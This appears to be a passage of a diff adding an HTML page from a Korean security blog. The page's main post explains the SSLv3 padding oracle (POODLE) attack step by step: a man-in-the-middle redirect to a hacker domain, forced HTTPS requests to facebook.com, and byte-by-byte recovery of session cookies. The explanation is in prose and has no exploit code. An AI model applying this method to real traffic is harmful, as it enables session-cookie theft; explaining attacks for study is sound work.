+<h4>Steps</h4>
+
+<ol>
+<li><p>유저가 이상한 링크를 클릭하거나, 아니면 Man-in-the-middle 포지션을 활용해서 강제로 HTTP redirect 를 보내서</p></li>
+<li><p>www.hacker.com 으로 redirect 시킨다.</p></li>
+<li><p>JavaScript 를 내려보내서 브라우저를 뺑뺑이 돌리는데, facebook.com 을 향해 수천 번의 https open request 를 감행하게 된다.</p></li>
+<li><p><code>GET /a HTTP/1.1 Cookie: ABCDE This_is_content MAC PADDING</code> 이 plaintext 가 될텐데, 이런 request 를 평균 256번 돌려서 cookie 1 글자를 recover 한다.</p></li>
+<li><p>SSLv3 의 Block cipher 로 암호화 블럭을 만들었을때, 마지막이 padding 만으로 이루어지도록 plaintext 의 length 를 조절한다. i.e. 128 bit block cipher 를 쓸 경우, 16 byte 로 떨어지면 null padding 이 붙게 된다. 즉 padding block 이 &lsquo;00 00 00 00 00 00 &hellip; 00 15&rsquo; 되게 plaintext 의 length 를 조절한다. 이로서 ciphertext 의 마지막 바이트를 15 로 통제할 수 있다.</p></li>
+<li><p>Man-in-the-middle 포지션을 활용해서, 통과하는 암호 스트림을 관찰하다가 마지막 padding 블럭을 조작한다. 어떻게 조작하냐면, 암호화된 cookie block 으로 overwrite 한다. 자기 아이디가지고 facebook.com 에 로그인해서, proxy 를 걸고, ciphertext 와 plaintext 를 비교해보면, cookie block 의 offset 정도는 알 수 있을 것이다.</p></li>
+<li><p>서버가 decrypt 에 성공하는지 관찰한다.</p></li>
+<li><p>SSLv3 가 제대로 구현되었다면, 무조건 decrypt 에러를 내는게 맞다. 하지만 (대부분의) SSLv3 구현은 padding length 만 사용하지, padding 값이 무엇인지는 상관안한다고 한다. 여기서 문제가 시작되는 것이다.</p></li>
+<li><p>서버가 SSL 에러를 안내면, 조작한 마지막 블럭의 마지막 바이트가 15 로 decrypt 되어 SSL error 가 나지 않은 경우이니, 마지막 바이트를 decrypt (and xor) 한 것이 15 라는 것을 알게되고.</p></li>
+<li><p>(Decrypted) Padding size byte > 15 면 SSL_PADDING_LENGTH_ERROR (or whatever) 가 날 것이고, padding size byte &lt; 15 면 padding 앞의 MAC 이 뒤로 밀리면서 SSL_MAC_ERROR (or whatever) 가 날 것이다.</p></li>
+<li><p>만약 SSL 에러가 나면, JavaScript 를 이용해서, 다시 https request 를 돌리고, SSL symmetric cipher 의 키는 random 으로 만들어지니, 언젠가는 15 와 맞아떨어지겠지 하면서, 서버가 decrypt 에 성공할때까지 돌린다.</p></li>
+<li><p>만약 서버가 decrypt 에 성공하면, CBC 모드의 특성상, decrypt(cookie 의 마지막 바이트) xor (끝에서 두번째 블럭의 ciphertext) == 15 란 이야기고, <code>끝에서 두번째 블럭의 ciphertext</code>는 네트워크에서 관찰하여 알 수 있으니, cookie 의 마지막 바이트는 recover 가능하다.</p></li>
+<li><p><code>GET /a HTTP/1.1 Cookie: ABCDE This_is_content MAC PADDING</code> -> <code>GET /ab HTTP/1.1 Cookie: ABCDE This_is_conten MAC PADDING</code> 와 같이 URI 는 <code>/ab</code> 로 1 글자 늘이고, HTTP content 부분은 1 글자 줄여서 Cookie: ABCDE 를 1 byte 오른쪽으로 shift 한다. 이제 <code>E</code> 는 recover 했고, block boundary 에 <code>...ABCD</code> 가 걸려서 D 가 끝이라고 가정하자. 전체 length 는 변하지 않았기 때문에, 원래가 마지막이 padding only 였다면, 이렇게 shift 한 것도 padding only 가 된다.</p></li>
+<li><p>이제 4. 로 돌아가서 다시 한글자를 브포한다.</p></li>
+</ol>
+
+
+<p>1 글자 recover 하는데 256 번 브포를 한다고 치면, cookie length * 256 번의 https negotiation 이 필요한 작업.</p>
+
+<h4>Moral of the story</h4>
+
+<p>SSLv3 가 padding length 만 체크하지, padding 의 내용을 확인하지 않아서 생기는 문제.</p>
+
+<p>Router 등을 장악해서 Man-in-the-middle 포지션을 확보했으면, 다른 더 좋은 공격 방법도 많을 것이라서, 굳이&hellip; 이렇게까지&hellip; 라는 생각은 든다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/09/22/android-sop-bypass/">Android SOP Bypass</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-09-22T09:40:47+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:40 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content">
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/11">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/9">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
